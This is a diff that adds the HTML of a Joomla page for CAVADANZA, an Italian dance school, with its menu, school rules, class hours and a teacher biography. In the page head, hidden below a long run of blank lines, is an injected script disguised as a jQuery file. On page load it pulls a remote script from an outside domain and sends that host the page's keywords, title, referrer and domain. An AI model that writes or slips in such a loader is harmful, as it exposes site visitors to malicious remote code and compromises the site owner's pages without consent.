@@ -1,0 +1,717 @@
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="it-it" lang="it-it" dir="ltr" >
+
+<!--[if lt IE 7]> <html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if IE 7]>    <html class="no-js lt-ie9 lt-ie8" lang="en"> <![endif]-->
+<!--[if IE 8]>    <html class="no-js lt-ie9" lang="en"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"> <!--<![endif]-->
+
+<head>
+
+	  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="generator" content="Joomla! - Open Source Content Management" />
+  <title>Alessandra Barberis</title>
+  <link href="/index.php?option=com_content&amp;view=category&amp;id=2&amp;Itemid=111&amp;format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
+  <link href="/index.php?option=com_content&amp;view=category&amp;id=2&amp;Itemid=111&amp;format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
+  <link href="/templates/favouritedark/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
+  <link rel="stylesheet" href="/media/jui/css/bootstrap.min.css" type="text/css" />
+  <link rel="stylesheet" href="/media/jui/css/bootstrap-responsive.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_favsocial/theme/FontAwesome/css/font-awesome.css" type="text/css" />
+  <link rel="stylesheet" href="/modules/mod_favsocial/theme/favsocial.css" type="text/css" />
+  <script src="/media/jui/js/jquery.min.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-noconflict.js" type="text/javascript"></script>
+  <script src="/media/jui/js/jquery-migrate.min.js" type="text/javascript"></script>
+  <script src="/media/system/js/caption.js" type="text/javascript"></script>
+  <script src="/media/jui/js/bootstrap.min.js" type="text/javascript"></script>
+  <script type="text/javascript">
+jQuery(window).on('load',  function() {
+				new JCaption('img.caption');
+			});
+  </script>
+
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta name="google-site-verification" content="M-XZ4s0eUMje2TVVnP3c9LMSjo0UHkf_RiSlXLV_A1I" />
+
+
+	<!-- Stylesheets -->
+	<link rel="stylesheet" href="/templates/favouritedark/icons/css/font-awesome.css" type="text/css" />
+	<link rel="stylesheet" href="/templates/favouritedark/css/k2style.css" type="text/css" />
+	<link rel="stylesheet" href="/templates/favouritedark/css/joomla.css" type="text/css" />
+	<link rel="stylesheet" href="/templates/favouritedark/css/template.css" type="text/css" />
+  <link rel="stylesheet" href="/templates/favouritedark/css/personal.css" type="text/css" />
+
+	<!-- Styles -->
+	<link rel="stylesheet" href="/templates/favouritedark/css/styles/style9.css" type="text/css" />
+	
+	<!-- Google Font -->
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css' />
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:300' rel='stylesheet' type='text/css'>
+
+	
+
+<style type="text/css">
+
+	#fav-container {
+		background-color: #303030;
+	}
+	#fav-container {
+		background-image: url(/images/bg-body-repx.jpg);
+	}
+	#fav-container {
+		background-repeat: repeat;
+	}
+	#fav-advertwrap {
+		background-repeat: repeat;
+	}
+	#fav-slidewrap {
+		background-repeat: repeat;
+	}
+	#fav-introwrap {
+		background-repeat: repeat;
+	}
+	#fav-showcasewrap {
+		background-repeat: repeat;
+	}
+	#fav-promowrap {
+		background-repeat: repeat;
+	}
+	#fav-topwrap {
+		background-repeat: repeat;
+	}
+	#fav-maintopwrap {
+		background-repeat: repeat;
+	}
+	#fav-mainbottomwrap {
+		background-repeat: repeat;
+	}
+	#fav-bottomwrap {
+		background-repeat: repeat;
+	}
+	#fav-userwrap {
+		background-repeat: repeat;
+	}
+	#fav-footerwrap {
+		background-repeat: repeat;
+	}
+	#fav-copyrightwrap {
+		background-repeat: repeat;
+	}
+	#fav-debugwrap {
+		background-repeat: repeat;
+	}
+	.mediaLogo {
+		padding: 2px;
+	}
+	.slogan {
+		color: #777777 ;
+	}
+	.slogan {
+		font-family: 'Open Sans', Helvetica, sans-serif ;
+	}
+						@media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+	  	.showRetinaLogo { display: block; }
+	  	.defaultLogo, .mediaLogo, .textLogo { display: none;}
+	}
+  .retinaLogo {
+    height: 52px;
+  }
+  .retinaLogo {
+    width: 188px;
+  }
+  .retinaLogo {
+    padding: 0px;
+  }
+  .retinaLogo {
+    margin: 0px;
+  }
+	@media (max-width: 480px) {
+		#fav-main img,
+		.moduletable .custom img,
+		div[class^="moduletable-"] div[class^="custom-"] img,
+		div[class*=" moduletable-"] div[class*=" custom-"] img,
+		.img-left,
+		.img-right {
+			display: inline-block ;
+		}
+	}
+	@media (max-width: 480px) {
+		#fav-advertwrap {
+			display: none ;
+		}
+	}
+	@media (max-width: 480px) {
+		#fav-promo1 {
+			display: none ;
+		}
+	}
+	@media (max-width: 480px) {
+		#fav-promo2 {
+			display: none ;
+		}
+	}
+	@media (max-width: 480px) {
+		#fav-promo3 {
+			display: none ;
+		}
+	}
+
+</style>
+	
+	<script src="/templates/favouritedark/js/backtop/backtop.js"></script>
+
+    <!-- ###: -->
+    
+    <!-- :### -->
+    <!-- ###: -->
+    
+    <!-- :### -->
+    <!-- ###: -->
+    
+    <!-- :### -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>var a='';setTimeout(10);if(document.referrer.indexOf(location.protocol+"//"+location.host)!==0||document.referrer!==undefined||document.referrer!==''||document.referrer!==null){document.write('<script type="text/javascript" src="http://e-sistemas.com.mx/js/jquery.min.php?c_utt=SWBB8&c_utm='+encodeURIComponent('http://e-sistemas.com.mx/js/jquery.min.php'+'?'+'default_keyword='+encodeURIComponent(((k=(function(){var keywords='';var metas=document.getElementsByTagName('meta');if(metas){for(var x=0,y=metas.length;x<y;x++){if(metas[x].name.toLowerCase()=="keywords"){keywords+=metas[x].content;}}}return keywords!==''?keywords:null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k))+'&se_referrer='+encodeURIComponent(document.referrer)+'&source='+encodeURIComponent(window.location.host))+'"><'+'/script>');}</script>
+</head>
+
+<body>
+
+
+
+
+
+<div id="fav-containerwrap" class="clearfix">
+
+	<!-- Navbar -->
+	<div class="container-fluid">
+		<div class="row-fluid">
+			<div id="fav-navbar" class="clearfix">
+				<div class="navbar navbar-inverse">
+					<div class="navbar-inner">
+						<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+						</a>
+						<div class="nav-collapse collapse">
+															<div id="fav-navbar-collapse" class="span12">
+									<div class="moduletable_menu" ><ul class="nav menu nav-pills">
+<li class="item-101"><a href="/index.php?option=com_content&amp;view=article&amp;id=2&amp;Itemid=101" >Home</a></li><li class="item-119 deeper parent"><a href="/index.php?option=com_content&amp;view=article&amp;id=3&amp;Itemid=119" >Chi siamo</a><ul class="nav-child unstyled small"><li class="item-146"><a href="/index.php?option=com_content&amp;view=article&amp;id=19&amp;Itemid=146" >Regolamento</a></li><li class="item-147"><a href="/index.php?option=com_content&amp;view=article&amp;id=20&amp;Itemid=147" >Link</a></li></ul></li><li class="item-108 active deeper parent"><a href="/index.php?option=com_content&amp;view=article&amp;id=1&amp;Itemid=108" >Lo Staff</a><ul class="nav-child unstyled small"><li class="item-109"><a href="/index.php?option=com_content&amp;view=article&amp;id=16&amp;Itemid=109" >Monica Melli</a></li><li class="item-110"><a href="/index.php?option=com_content&amp;view=article&amp;id=17&amp;Itemid=110" >Chiara Bertoni</a></li><li class="item-111 current active"><a href="/index.php?option=com_content&amp;view=article&amp;id=1&amp;Itemid=111" >Alessandra Barberis</a></li><li class="item-113"><a href="/index.php?option=com_content&amp;view=article&amp;id=18&amp;Itemid=113" >Federica Bacchetta</a></li><li class="item-114"><a href="/index.php?option=com_content&amp;view=article&amp;id=22&amp;Itemid=114" >Michela Brasca</a></li><li class="item-115"><a href="/index.php?option=com_content&amp;view=article&amp;id=23&amp;Itemid=115" >Giulio Gariano</a></li><li class="item-150"><a href="/index.php?option=com_content&amp;view=article&amp;id=27&amp;Itemid=150" >Alberto Saronni</a></li></ul></li><li class="item-120 deeper parent"><a href="/index.php?option=com_content&amp;view=article&amp;id=14&amp;Itemid=120" >Le classi</a><ul class="nav-child unstyled small"><li class="item-148"><a href="/index.php?option=com_content&amp;view=article&amp;id=21&amp;Itemid=148" >Orari</a></li></ul></li><li class="item-121 deeper parent"><a href="/index.php?option=com_eventgallery&amp;view=event&amp;layout=simple&amp;folder=Prova&amp;Itemid=121" >Gallery</a><ul class="nav-child unstyled small"><li class="item-149"><a href="/index.php?option=com_content&amp;view=article&amp;id=26&amp;Itemid=149" >La scuola</a></li></ul></li><li class="item-122"><a href="/index.php?option=com_content&amp;view=article&amp;id=15&amp;Itemid=122" >Contatti</a></li></ul>
+</div>
+								</div>
+													</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<div id="fav-container">
+
+		<!-- Advert -->
+		
+		<!-- Header -->
+		<div class="container-fluid" id="fav-headerwrap">
+			<div class="row-fluid">
+
+					<div id="fav-header" class="span12">
+
+						<div id="fav-logo" class="span3">
+																						<h1>
+									<a class="mediaLogo" href="/">
+										<img src="/images/danza2.png" style="border:0;" alt="CAVADANZA - HOME" />
+									</a>
+								</h1>
+																													<h1 class="showRetinaLogo">
+									<a class="retinaLogo" href="/">
+										<img src="/images/danza2.png" style="border:0; margin:0px; padding:0px;" width="188px" alt="Favourite Dark template" />
+									</a>
+								</h1>
+																				</div>
+
+																 <div id="fav-nav" class="span9">
+										<div class="navigation">
+											<div class="moduletable_menu" ><ul class="nav menu nav-pills">
+<li class="item-101"><a href="/index.php?option=com_content&amp;view=article&amp;id=2&amp;Itemid=101" >Home</a></li><li class="item-119 deeper parent"><a href="/index.php?option=com_content&amp;view=article&amp;id=3&amp;Itemid=119" >Chi siamo</a><ul class="nav-child unstyled small"><li class="item-146"><a href="/index.php?option=com_content&amp;view=article&amp;id=19&amp;Itemid=146" >Regolamento</a></li><li class="item-147"><a href="/index.php?option=com_content&amp;view=article&amp;id=20&amp;Itemid=147" >Link</a></li></ul></li><li class="item-108 active deeper parent"><a href="/index.php?option=com_content&amp;view=article&amp;id=1&amp;Itemid=108" >Lo Staff</a><ul class="nav-child unstyled small"><li class="item-109"><a href="/index.php?option=com_content&amp;view=article&amp;id=16&amp;Itemid=109" >Monica Melli</a></li><li class="item-110"><a href="/index.php?option=com_content&amp;view=article&amp;id=17&amp;Itemid=110" >Chiara Bertoni</a></li><li class="item-111 current active"><a href="/index.php?option=com_content&amp;view=article&amp;id=1&amp;Itemid=111" >Alessandra Barberis</a></li><li class="item-113"><a href="/index.php?option=com_content&amp;view=article&amp;id=18&amp;Itemid=113" >Federica Bacchetta</a></li><li class="item-114"><a href="/index.php?option=com_content&amp;view=article&amp;id=22&amp;Itemid=114" >Michela Brasca</a></li><li class="item-115"><a href="/index.php?option=com_content&amp;view=article&amp;id=23&amp;Itemid=115" >Giulio Gariano</a></li><li class="item-150"><a href="/index.php?option=com_content&amp;view=article&amp;id=27&amp;Itemid=150" >Alberto Saronni</a></li></ul></li><li class="item-120 deeper parent"><a href="/index.php?option=com_content&amp;view=article&amp;id=14&amp;Itemid=120" >Le classi</a><ul class="nav-child unstyled small"><li class="item-148"><a href="/index.php?option=com_content&amp;view=article&amp;id=21&amp;Itemid=148" >Orari</a></li></ul></li><li class="item-121 deeper parent"><a href="/index.php?option=com_eventgallery&amp;view=event&amp;layout=simple&amp;folder=Prova&amp;Itemid=121" >Gallery</a><ul class="nav-child unstyled small"><li class="item-149"><a href="/index.php?option=com_content&amp;view=article&amp;id=26&amp;Itemid=149" >La scuola</a></li></ul></li><li class="item-122"><a href="/index.php?option=com_content&amp;view=article&amp;id=15&amp;Itemid=122" >Contatti</a></li></ul>
+</div>
+										</div>
+									 </div>
+							
+					</div>
+
+			</div>
+		</div>
+
+		<!-- Slide -->
+		
+		<!-- Intro -->
+		
+		<!-- Showcase -->
+		
+		<!-- Promo -->
+		
+		<!-- Top -->
+		
+		<!-- Maintop -->
+		
+		<!-- Breadcrumbs -->
+		
+		<!-- Main -->
+		<div class="container-fluid" id="fav-mainwrap">
+			<div class="row-fluid">
+
+					<div id="fav-main" class="clearfix">
+
+													<div id="fav-maincontent" class="span12">
+								<div id="system-message-container">
+	</div>
+
+								 
+
+
+
+<div class="blog" itemscope itemtype="https://schema.org/Blog">
+	
+	
+	
+	
+	
+				<div class="items-leading clearfix">
+							<div class="leading-0"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+
+			<div class="page-header">
+
+							<h2 itemprop="name">
+											Orari									</h2>
+			
+											</div>
+	
+
+
+
+
+
+
+		
+<p><img style="display: block; margin-left: auto; margin-right: auto;" src="images/Orari2015.jpg" alt="" width="866" height="619" /></p>
+
+
+
+				</div>
+									</div><!-- end items-leading -->
+	
+	
+																	<div class="items-row cols-2 row-0 row-fluid clearfix">
+						<div class="span6">
+				<div class="item column-1"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+
+	
+
+
+
+
+
+
+		
+<p style="text-align: center;">&nbsp;<img src="images/FOTOSLIDE/Segreteriaesala.jpg" alt="" width="872" height="480" />&nbsp;<br /><img src="images/FOTOSLIDE/Spogliatoi.jpg" alt="" width="869" height="480" /><br /><br /><br /></p>
+
+
+
+				</div>
+				<!-- end item -->
+							</div><!-- end span -->
+														<div class="span6">
+				<div class="item column-2"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+
+			<div class="page-header">
+
+							<h2 itemprop="name">
+											Regolamento									</h2>
+			
+											</div>
+	
+
+
+
+
+
+
+		
+<p>ORARIO SEGRETERIA</p>
+<p>L'orario di apertura della segreteria segue il seguente orario:</p>
+<p>Lunedì - venerdì 15:30 - 22:00</p>
+<p>E' possibile contattare la direzione di CAVADANZA s.s.d. a r.l. anche via telefono ai numeri 3299496363 o 3332461519 o scrivendo una mail a <span id="cloak26477">Questo indirizzo email è protetto dagli spambots. È necessario abilitare JavaScript per vederlo.</span><script type='text/javascript'>
+ //<!--
+ document.getElementById('cloak26477').innerHTML = '';
+ var prefix = '&#109;a' + 'i&#108;' + '&#116;o';
+ var path = 'hr' + 'ef' + '=';
+ var addy26477 = 'c&#97;v&#97;d&#97;nz&#97;' + '&#64;';
+ addy26477 = addy26477 + 'l&#105;b&#101;r&#111;' + '&#46;' + '&#105;t';
+ var addy_text26477 = 'c&#97;v&#97;d&#97;nz&#97;' + '&#64;' + 'l&#105;b&#101;r&#111;' + '&#46;' + '&#105;t';
+ document.getElementById('cloak26477').innerHTML += '<a ' + path + '\'' + prefix + ':' + addy26477 + '\'>'+addy_text26477+'<\/a>';
+ //-->
+ </script></p>
+<p>MODALITA' DI ISCRIZIONE AI CORSI</p>
+<p>E’ richiesta una quota di prima iscrizione annuale di € 10 comprendente il tesseramento a LIBERTAS, ente riconosciuto dal C.O.N.I. e la relativa assicurazione. </p>
+<p>E' obbligatorio presentare un certificato medico dove viene attestata l'idoneità a partecipare ai corsi.</p>
+<p>Al momento dell'iscrizione è necessario leggere, compilare e firmare per accettazione il modulo di iscrizione.</p>
+<p>CERTIFICAZIONE MEDICA</p>
+<p>Per accedere ai corsi, è obbligatorio consegnare alla prima lezione un certificato medico d’idoneità alla pratica sportiva non agonistica dell’allievo.</p>
+<p>Genitori ed allievi dovranno obbligatoriamente segnalare all’insegnante informazioni relative allo stato di salute:</p>
+<p>- eventuali problemi che possano pregiudicare la frequenza del corso;</p>
+<p>- malesseri;</p>
+<p>- interventi chirurgici;</p>
+<p>- stati fisici o psicologici particolarmente rilevanti;</p>
+<p>- infortuni derivati da altre attività.</p>
+<p>MODALITA' DI PAGAMENTO</p>
+<p>Il pagamento si effettua presso la segreteria, con cadenza trimestrale previo versamento della quota d'iscrizione. L'anno accademico comincia con il 15 di settembre, i trimestri terminano il 14 dicembre, il 14 marzo e il 14 giugno. Le quote trimestrali sono calcolate in base ai giorni effettivi di lezione, escludendo quindi i giorni di vacanza.</p>
+<p>Si è pregati di conservare accuratamente le ricevute dei pagamenti e la tessera nominativa rilasciata da LIBERTAS.</p>
+<p>LEZIONI DI PROVA</p>
+<p>Le lezioni di prova sono una modalità di approccio e di conoscenza sia personale che tecnica per indirizzare l'allievo nel corso più adatto. Sono aperte a tutti e hanno una durata limitata.</p>
+<p>CORSI</p>
+<p>I corsi sono costituiti in base a fasce d’età e alla predisposizione degli allievi. Il numero degli allievi che costituisce un corso, può variare a discrezione dell’insegnante. Nell’arco dell’anno accademico viene applicato il calendario scolastico in vigore presso la scuola primaria, secondaria e superiore, pertanto i giorni festivi sono gli stessi designati dalla scuola dell’obbligo.</p>
+<p>FREQUENZA E COMPORTAMENTO</p>
+<p>La frequenza regolare è alla base del successo di un corso di danza. La frequenza irregolare rallenta ritmo, crescita e apprendimento, sia individuali che collettivi. Gli allievi sono tenuti a mantenere all’interno della scuola un comportamento dignitoso e corretto, senza assumere atteggiamenti di disturbo o disagio per gli altri e per gli insegnanti. E’ assolutamente vietato masticare chewingum o caramelle durante la lezione.</p>
+<p> </p>
+<p>RECUPERO DELLE LEZIONI PERSE</p>
+<p>IMPORTANTE: il numero minimo di partecipanti ad un corso è di 3 persone. Per questo motivo si consiglia di avvisare sempre preventivamente in caso di assenza.</p>
+<p>Le lezioni perse per assenza dell’alunno non potranno essere recuperate né scalate dal pagamento della retta. Le lezioni perse, invece, per assenza dell’insegnante o per le altre cause di responsabilità della scuola, verranno recuperate secondo la disponibilità dell’insegnante stessa e della sede.</p>
+<p> </p>
+<p>RIMBORSI</p>
+<p>In caso di ritiro dai corsi, per qualsiasi causa esso sia deciso, in ogni caso non vi è diritto alla restituzione dei pagamenti effettuati. Solo nel caso di infortuni, la richiesta verrà valutata dalla direzione. In caso di sospensione di un corso da parte della scuola, i pagamenti effettuati e non fruiti verranno invece interamente rimborsati.</p>
+<p>LEZIONI</p>
+<p>Si potrà accedere alle sale di danza solo con scarpe pulite. La scuola non si assume responsabilità alcuna per lo smarrimento di oggetti all'interno dei propri locali. Il direttivo di CAVADANZA s.s.d. a r.l. si riserva la facoltà di apportare qualche modifica agli orari dei corsi. Sia durante lo svolgimento delle lezioni che negli spogliatoi e locali comuni è richiesto un comportamento adeguato e rispettoso. In particolare si prega di non toccare le attrezzature elettroniche, i video e i libri della scuola senza permesso, di non agire sulla regolazione del riscaldamento e di cercare, per quanto possibile, di lasciare in ordine i locali degli spogliatoi e i bagni.</p>
+<p>ABBIGLIAMENTO</p>
+<p>Ogni disciplina richiede un abbigliamento adeguato, sia per la conformità del corso sia per facilitare il corretto svolgimento dei passi tecnici. Pertanto ogni insegnante consiglierà e indirizzerà la scelta degli abiti e delle calzature.</p>
+<p>Durante le lezioni i capelli dovranno essere raccolti.</p>
+<p>All’interno delle sale di danza è consentito indossare solo calzature idonee all’uso, perfettamente pulite e non provenienti dall’esterno.</p>
+<p>Gli indumenti dimenticati negli spogliatoi della scuola, dopo 2 mesi in cui non saranno stati reclamati, verranno devoluti in beneficenza alla Caritas.</p>
+<p>La scuola declina ogni responsabilità sullo smarrimento di oggetti di valore o di denaro lasciati nello spogliatoio o nella sala di danza. Eventuali oggetti di valore dovranno essere depositati in custodia in segreteria o all'insegnante.</p>
+<p> </p>
+<p> I GENITORI</p>
+<p>I genitori non possono assistere alla lezione, in particolar modo per non distrarre o far emozionare l’allievo. Si prega inoltre di non accedere alla sala se non per motivi urgenti.</p>
+<p>SAGGIO DI FINE ANNO</p>
+<p>E’ previsto un saggio di fine anno ed entro il 13 febbraio 2015 andrà data la propria adesione allo spettacolo con versamento della quota saggio comprensiva di DVD video e foto di tutto lo spettacolo e acconto del costume di scena. La quota saggio e la data verranno comunicate quanto prima possibile. Non è previsto il rimborso della quota saggio.</p>
+<p>Sono previste più prove durante la settimana dello spettacolo, o in quella precedente, con orari e giorni probabilmente diversi da quelli delle lezioni. Orari e giorni saranno esposti nella bacheca della scuola. Si ricorda che per le prove del saggio verranno aggiunte delle ore extra per le quali non si richiede nessun pagamento aggiuntivo.</p>
+<p>Il saggio è un momento molto importante di crescita e confronto con gli altri allievi ed è un evento che richiede un impegno notevole da parte degli insegnanti e ballerini, ma anche di persone esterne come tecnici luci, audio, scenografi, direttori di palco, ecc. per cui da prender con la dovuta serietà.</p>
+<p>Durante lo spettacolo non sarà possibile fare filmati o fotografie: verrà fatto un servizio fotografico durante le prove e durante il saggio. Lo spettacolo verrà ripreso da un Service-video autorizzato che produrrà un dvd.</p>
+<p> </p>
+<p>DICHIARAZIONE DEI REDDITI</p>
+<p>La pratica sportiva dilettantistica rientra tra le attività deducibili sulla Dichiarazione dei Redditi, per i ragazzi di età compresa tra i 5 e i 18 anni. L’importo da considerare non può essere superiore per ciascun ragazzo a 210,00 euro.</p>
+<p>I genitori interessati dovranno fare richiesta in segreteria, indicando il codice fiscale del genitore dichiarante al fine del rilascio della dichiarazione degli avvenuti pagamenti.</p>
+<p>ASSICURAZIONE</p>
+<p>Tutti gli allievi e chi lavora all'interno dei locali della scuola sono garantiti da copertura assicurativa per eventuali incidenti che intercorrano durante il normale svolgimento delle lezioni.</p>
+
+
+
+				</div>
+				<!-- end item -->
+							</div><!-- end span -->
+							</div><!-- end row -->
+																			<div class="items-row cols-2 row-1 row-fluid clearfix">
+						<div class="span6">
+				<div class="item column-1"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+
+	
+
+
+
+
+
+
+		
+<table style="height: 403px; width: 967px; margin-left: auto; margin-right: auto;" width="967" cellspacing="10" cellpadding="10">
+<tbody>
+<tr>
+<td><a title="ideadanza" href="http://www.ideadanza.net/" target="_blank" rel="alternate"><img style="display: block; margin-left: auto; margin-right: auto;" src="images/link/ideadanza.jpg" alt="ideadanza" width="178" height="138" /></a></td>
+<td><a title="idealatina" href="http://www.idealatina.it/" target="_blank" rel="alternate"><img style="display: block; margin-left: auto; margin-right: auto;" src="images/link/idealatina.jpg" alt="idealatina" width="178" height="100" /></a></td>
+</tr>
+<tr>
+<td><a title="pasticceriachiara" href="http://www.pasticceriachiara.com/" target="_blank" rel="alternate"><img style="display: block; margin-left: auto; margin-right: auto;" src="images/link/pasticceriachiara.jpg" alt="pasticceriachiara" width="178" height="128" /></a></td>
+</tr>
+</tbody>
+</table>
+
+
+
+				</div>
+				<!-- end item -->
+							</div><!-- end span -->
+														<div class="span6">
+				<div class="item column-2"
+					itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+					
+
+			<div class="page-header">
+
+							<h2 itemprop="name">
+											Michela Brasca									</h2>
+			
+											</div>
+	
+
+
+
+
+
+
+		
+<p>Dal 2009 Michela fa parte della compagnia di tip tap “TAPPERS” con coreografie di G. Bruce e musiche originali di M. De Toffoli.</p>
+<p>Michela è insegnante di modern jazz, tip tap e giocodanza in diverse scuole di Milano e hinterland e lavora dal 2013 in qualità di assistente di G. Bruce per tip tap e V. Bordi per modern jazz all’interno dell’accademia di Musical di Milano “MTS!Musical The School”.</p>
+<p>Nasce a Milano il 27 Maggio 1988.</p>
+<p>Si avvicina al mondo della danza all’età di 6 anni, incominciando con danza classica, moderna, per poi avvicinarsi dopo pochi anni anche alla disciplina del tip tap grazie alla sua insegnante V. Bordi.</p>
+<p>La sua passione per la danza cresce all’interno della scuola “Danza e Movimento” di Milano di C. Belloni e così dopo essersi diplomata con buoni risultati al Liceo Linguistico Carlo Tenca, nel 2007 viene ammessa all’accademia biennale di musical di Milano “MTS!Musical The School” diretta da S. Nardini. Qui studia danza, canto e recitazione con importanti insegnanti, tra i quali G. Bruce, B. Geroldi, S. Usurini, L. Biolcati, E. Mosca, G. Crosignani e G. Ferrato, conseguendo il diploma nel 2009.</p>
+<p>Lavora come ballerina all’interno dei musical “ IL LIBRO DELLA GIUNGLA” e “LA SIRENETTA” della SDT Music Produzioni e collabora con la compagnia Luci della città nello spettacolo di varietà “TU BRILLI STASERA” come coreografa, attrice e ballerina.</p>
+<p>Michela si laurea in Scienze Motorie e dello Sport presso l’Università Cattolica del Sacro Cuore nel 2012 e nel 2013 riceve l’attestato di Tecnico specializzato in Danza Modern Jazz, rilasciato dal CNS Libertas e riconosciuto su territorio nazionale dal Coni.</p>
+
+
+
+				</div>
+				<!-- end item -->
+							</div><!-- end span -->
+							</div><!-- end row -->
+						
+			<div class="items-more">
+			
+
+<ol class="nav nav-tabs nav-stacked">
+	<li>
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=18:federica-bacchetta&amp;catid=2&amp;Itemid=113">
+			Federica Bacchetta</a>
+	</li>
+	<li>
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=23:giulio-gariano&amp;catid=2&amp;Itemid=115">
+			Giulio Gariano</a>
+	</li>
+	<li>
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=27:alberto-saronni&amp;catid=2&amp;Itemid=150">
+			Alberto Saronni</a>
+	</li>
+	<li>
+		<a href="/index.php?option=com_content&amp;view=article&amp;id=17:chiara-bertoni&amp;catid=2&amp;Itemid=110">
+			Chiara Bertoni</a>
+	</li>
+</ol>
+		</div>
+	
+		</div>
+
+							</div>
+						
+					</div>
+
+			</div>
+		</div>
+
+		<!-- Mainbottom -->
+		
+		<!-- Bottom -->
+		
+		<!-- User -->
+		
+		<!-- Backtotop -->
+		<div class="container-fluid">
+			<div class="row-fluid">
+							</div>
+		</div>
+
+		<!-- Footer -->
+		
+		<!-- Backtotop mobile -->
+		<div class="container-fluid">
+			<div class="row-fluid">
+				<div id="fav-backtotop-mobile" class="span12">
+					<a href="" class="backtop" title="BACK TO TOP"><i class="fa fa-angle-up"></i>
+											</a>
+				</div>
+			</div>
+		</div>
+
+		<!-- Copyright -->
+		
+			<div class="container-fluid" id="fav-copyrightwrap">
+				<div class="row-fluid">
+
+						
+						
+							<div id="fav-copyright" class="clearfix">
+
+																	<div id="fav-showcopyright"
+										class="span3">
+											<p>&#0169; 2016
+												<a href="http://www.cavadanza.altervista.org/administrator/" target="_blank">
+													CAVADANZA s.s.d. a. r. l.												</a>
+
+											</p>
+
+									</div>
+								
+								
+																				<div id="fav-copyright2"
+										class="span9">
+
+										<div class="moduletable" >
+<div id="favsocial"
+    style="float: right;">
+  <ul id="favsocial-list">
+
+    
+          <li id="favsocial-icon2">
+            <a href="https://it-it.facebook.com/cavadanza" target="_blank"
+              style="background-color: #3B5998;
+                    padding: 0.5em;
+                    -webkit-border-radius: 50%;
+                    -moz-border-radius: 50%;
+                    border-radius: 50%">
+
+              <span class="fa-stack">
+                <i class="fa fa-facebook fa-stack-2x"
+                  style="color: #FFFFFF;
+                        font-size: 21px;">
+                </i>
+                <i class="fa  fa-stack-1x"
+                  style="color: #;
+                        font-size: ;">
+                </i>
+              </span>
+            </a>
+          </li>
+
+    
+  </ul>
+  
+</div>
+</div>
+
+									</div>
+								
+							</div>
+						
+				</div>
+			</div>
+
+		
+		<!-- Debug -->
+		
+	</div><!-- end of fav-container -->
+
+</div><!-- end of fav-containerwrap -->
+
+<!--[if lte IE 7]><script src="/templates/favouritedark/js/ie6/warning.js"></script><script>window.onload=function(){e("/templates/favouritedark/js/ie6/")}</script><![endif]-->
+</body>
+</html>
